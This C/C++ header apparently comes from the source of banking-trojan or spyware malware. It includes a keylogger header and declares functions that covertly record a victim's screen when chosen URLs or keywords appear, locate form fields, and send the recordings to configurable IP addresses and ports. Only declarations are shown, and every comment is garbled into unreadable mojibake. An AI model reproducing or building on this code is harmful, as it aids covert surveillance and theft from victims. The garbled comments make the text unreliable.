#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"


// ������������ ������ ������ ��� ������ ������
#define MAX_VIDEO_REC_URLS_LEN 3000

// ������������ ������ ������ ������ ������ �����
#define MAX_VIDEO_REC_HOST_LEN 50

void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//�������� ����� ������ �����
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//�������� ����� ������ �����
void StopRecordThread();//������������� ����� ������ �����
void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//���������� ��� � �������� �� ��� �-���

//���� ���� ������ ���� ��������� ������� � �����, �������� ��� �������� ����������
void StartFindFields();
DWORD WINAPI StartSendinThread(LPVOID Data);

//������� ���������� ����� ������� ��� ������ �����
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();

//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  ������ ������� ������������� ������ �����
//  ���������� ������� - ������ ����� �������� �� �������
//  ������������������� ��������
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - ������� ��������� ������ �������������
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - ������� �������� ������ ������
	//					����� ��� �������� ��������
	//
	// URL - ����� ���� ��� �������� ���������������� ������.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	// StopRecording - ������� ������������� ������ ������
	//					����� ��� �������� ��������
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - ������� ��������� �������� ��
	//               ������ ������ � ��������� PID
	//	���� PID ����� 0 �� ����� ����������� �������
	//  �������
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif